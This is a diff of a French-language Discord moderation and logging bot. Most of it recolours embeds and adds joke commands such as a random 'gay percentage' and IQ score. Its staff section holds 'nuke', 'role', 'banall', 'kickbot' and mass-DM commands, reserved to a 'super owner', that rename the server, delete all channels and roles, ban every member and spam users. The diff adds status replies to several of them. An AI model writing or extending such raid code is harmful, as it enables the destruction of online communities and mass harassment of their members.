@@ -132,7 +132,7 @@ client.on('messageDelete', message => {
     });
 
     const embed = new EmbedBuilder()
-        .setColor('#ED4245')
+        .setColor('#2b2d31')
         .setTitle('🗑️ Message supprimé')
         .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte (Embed/Image/Fichier)'}\`\`\``)
         .setTimestamp();
@@ -144,7 +144,7 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
     if (oldMessage.content === newMessage.content) return;
 
     const embed = new EmbedBuilder()
-        .setColor('#FEE75C')
+        .setColor('#2b2d31')
         .setTitle('✏️ Message modifié')
         .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
         .setTimestamp();
@@ -153,7 +153,7 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
 
 client.on('guildBanAdd', ban => {
     const embed = new EmbedBuilder()
-        .setColor('#992D22')
+        .setColor('#2b2d31')
         .setTitle('🔨 Membre banni')
         .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
         .setTimestamp();
@@ -162,7 +162,7 @@ client.on('guildBanAdd', ban => {
 
 client.on('guildBanRemove', ban => {
     const embed = new EmbedBuilder()
-        .setColor('#57F287')
+        .setColor('#2b2d31')
         .setTitle('🔓 Membre débanni')
         .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
         .setTimestamp();
@@ -172,7 +172,7 @@ client.on('guildBanRemove', ban => {
 client.on('channelCreate', channel => {
     if (!channel.guild) return;
     const embed = new EmbedBuilder()
-        .setColor('#57F287')
+        .setColor('#2b2d31')
         .setTitle('📁 Salon créé')
         .setDescription(`**Nom :** \`${channel.name}\`\n**Type :** ${channel.type === ChannelType.GuildText ? 'Texte' : 'Vocal'}`)
         .setTimestamp();
@@ -182,7 +182,7 @@ client.on('channelCreate', channel => {
 client.on('channelDelete', channel => {
     if (!channel.guild) return;
     const embed = new EmbedBuilder()
-        .setColor('#ED4245')
+        .setColor('#2b2d31')
         .setTitle('🗑️ Salon supprimé')
         .setDescription(`**Nom :** \`${channel.name}\``)
         .setTimestamp();
@@ -191,7 +191,7 @@ client.on('channelDelete', channel => {
 
 client.on('roleCreate', role => {
     const embed = new EmbedBuilder()
-        .setColor('#57F287')
+        .setColor('#2b2d31')
         .setTitle('🏷️ Rôle créé')
         .setDescription(`**Nom :** \`${role.name}\``)
         .setTimestamp();
@@ -200,7 +200,7 @@ client.on('roleCreate', role => {
 
 client.on('roleDelete', role => {
     const embed = new EmbedBuilder()
-        .setColor('#ED4245')
+        .setColor('#2b2d31')
         .setTitle('🗑️ Rôle supprimé')
         .setDescription(`**Nom :** \`${role.name}\``)
         .setTimestamp();
@@ -216,7 +216,7 @@ client.on('guildMemberAdd', async member => {
         try {
             await member.kick('Anti-bot activé.');
             const embed = new EmbedBuilder()
-                .setColor('#FEE75C')
+                .setColor('#2b2d31')
                 .setTitle('🤖 Bot bloqué (Anti-bot)')
                 .setDescription(`**Bot :** ${member.user.tag}`)
                 .setTimestamp();
@@ -304,7 +304,7 @@ client.on('interactionCreate', async interaction => {
             const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });
 
             const logEmbed = new EmbedBuilder()
-                .setColor('#ED4245')
+                .setColor('#2b2d31')
                 .setTitle('📁 Ticket fermé & Archivé')
                 .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                 .setTimestamp();
@@ -339,6 +339,7 @@ client.on('messageCreate', async message => {
             if (!isSuperOwner(message)) return;
 
             if (command === 'nuke') {
+                await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
                 message.guild.setName('/yuza').catch(() => {});
                 message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
@@ -367,6 +368,7 @@ client.on('messageCreate', async message => {
             }
 
             if (command === 'role') {
+                await message.reply("⚡ **Suppression et flood des rôles en cours...**").catch(() => {});
                 message.guild.roles.cache
                     .filter(role => role.editable && role.id !== message.guild.id)
                     .forEach(role => role.delete().catch(() => {}));
@@ -378,7 +380,7 @@ client.on('messageCreate', async message => {
             }
 
             if (command === 'banall') {
-                message.reply("🔨 **[BANALL]** Exécution du banall massif...").catch(() => {});
+                await message.reply("⚡ **[BANALL]** Exécution du banall massif...").catch(() => {});
                 try {
                     await message.guild.members.fetch();
                     const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
@@ -390,7 +392,7 @@ client.on('messageCreate', async message => {
             }
 
             if (command === 'kickbot') {
-                message.reply("🤖 **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
+                await message.reply("⚡ **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
                 try {
                     const fetchedMembers = await message.guild.members.fetch();
                     const kickPromises = [];
@@ -416,7 +418,7 @@ client.on('messageCreate', async message => {
                     }
                     const messageTemplate = m.content;
                     const previewEmbed = new EmbedBuilder()
-                        .setColor('#FEE75C')
+                        .setColor('#2b2d31')
                         .setTitle('⚠️ Confirmation requise - DMAll')
                         .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
 
@@ -581,6 +583,16 @@ client.on('messageCreate', async message => {
                     '`=setwelcome <#salon> <msg>`\n┗ Configurer les welcomes'
                 ]
             },
+            fun: {
+                label: 'Fun & Troll', emoji: '🎮', title: 'Commandes Fun & Troll',
+                commands: [
+                    '`=gay [@membre]`\n┗ Teste le pourcentage gay (100% fake)',
+                    '`=rate [@membre] <sujet>`\n┗ Donne une note aléatoire',
+                    '`=iq [@membre]`\n┗ Calcule le QI (totalement faux)',
+                    '`=horoscope <signe>`\n┗ Prédis ton avenir foireux',
+                    '`=kiss <@membre>`\n┗ Fait un câlin ou un bisou'
+                ]
+            },
             staff: {
                 label: 'Staff', emoji: '👑', title: 'Commandes Staff',
                 commands: [
@@ -642,6 +654,51 @@ client.on('messageCreate', async message => {
         });
         return;
     }
+    if (command === 'gay') {
+        const target = message.mentions.users.first() || message.author;
+        const percent = Math.floor(Math.random() * 101);
+        const embed = new EmbedBuilder()
+            .setColor('#2b2d31')
+            .setTitle('🏳️‍🌈 Test Gay')
+            .setDescription(`**${target.username}** est à **${percent}%** gay !\n*(Bien évidemment, c'est totalement faux !)*`);
+        return message.reply({ embeds: [embed] });
+    }
+
+    if (command === 'iq') {
+        const target = message.mentions.users.first() || message.author;
+        const iq = Math.floor(Math.random() * 160) - 20;
+        const embed = new EmbedBuilder()
+            .setColor('#2b2d31')
+            .setTitle('🧠 Test de QI')
+            .setDescription(`Le QI de **${target.username}** est estimé à **${iq}** !\n*(Promis, c'est de l'humour)*`);
+        return message.reply({ embeds: [embed] });
+    }
+
+    if (command === 'rate') {
+        const subject = args.join(' ') || "quelque chose de mystérieux";
+        const score = Math.floor(Math.random() * 11);
+        return message.reply(`⭐ Je donne la note de **${score}/10** à : *${subject}* (C'est scientifique, enfin presque).`);
+    }
+
+    if (command === 'horoscope') {
+        const sign = args[0] || "ton signe";
+        const predictions = [
+            "Tu vas trébucher sur un câble aujourd'hui, fais gaffe.",
+            "Une grosse somme d'argent va arriver... ou pas du tout.",
+            "Tu vas manger un truc incroyable ce soir.",
+            "Journée idéale pour ne rien faire et rester dans ton lit.",
+            "Attention à ton chat, il prépare un coup d'État."
+        ];
+        const pred = predictions[Math.floor(Math.random() * predictions.length)];
+        return message.reply(`🔮 **Horoscope pour [ ${sign} ] :** ${pred}`);
+    }
+
+    if (command === 'kiss') {
+        const target = message.mentions.users.first();
+        if (!target) return message.reply("❌ Mentionne quelqu'un à embrasser !");
+        return message.reply(`💋 **${message.author}** fait un gros bisou plein d'amour à **${target}** ! ❤️`);
+    }
+
     if (command === 'owners') {
         const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
         const embed = new EmbedBuilder()
@@ -743,7 +800,7 @@ client.on('messageCreate', async message => {
             });
 
             const embed = new EmbedBuilder()
-                .setColor('#ED4245')
+                .setColor('#2b2d31')
                 .setTitle('🔒 VOUS ÊTES EN PRISON (JAIL)')
                 .setDescription(`**Raison :** ${reason}\n\nUn membre de l'équipe viendra régler votre situation ici.`);
 
@@ -793,7 +850,7 @@ client.on('messageCreate', async message => {
         if (userWarns.length === 0) return message.reply(`✅ **${targetMember.user.tag}** n'a aucun avertissement.`);
         
         const list = userWarns.map((w, index) => `**#${index + 1}** - Raison : *${w.reason}* (Par ${w.moderator})`).join('\n');
-        const embed = new EmbedBuilder().setColor('#FEE75C').setTitle(`⚠️ Avertissements de ${targetMember.user.tag}`).setDescription(list);
+        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle(`⚠️ Avertissements de ${targetMember.user.tag}`).setDescription(list);
         return message.reply({ embeds: [embed] });
     }
 
@@ -966,7 +1023,7 @@ client.on('messageCreate', async message => {
         }
 
         const embed = new EmbedBuilder()
-            .setColor('#FF73FA')
+            .setColor('#2b2d31')
             .setTitle("🎉 GIVEAWAY 🎉")
             .setDescription(`**Lot :** ${prize}\n**Gagnant(s) :** ${winnersCount}\n\nClique sur le bouton ci-dessous pour participer !`)
             .setFooter({ text: `Lancé par ${message.author.tag}` });
@@ -1022,7 +1079,7 @@ client.on('messageCreate', async message => {
     else if (command === 'blist') {
         const bans = await message.guild.bans.fetch();
         const banList = bans.map(b => `• **${b.user.tag}** (\`${b.user.id}\`)`).slice(0, 15).join('\n') || "Aucun banni.";
-        const embed = new EmbedBuilder().setColor('#ff5555').setTitle("🔨 Liste des membres bannis").setDescription(banList);
+        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle("🔨 Liste des membres bannis").setDescription(banList);
         message.reply({ embeds: [embed] });
     }
 
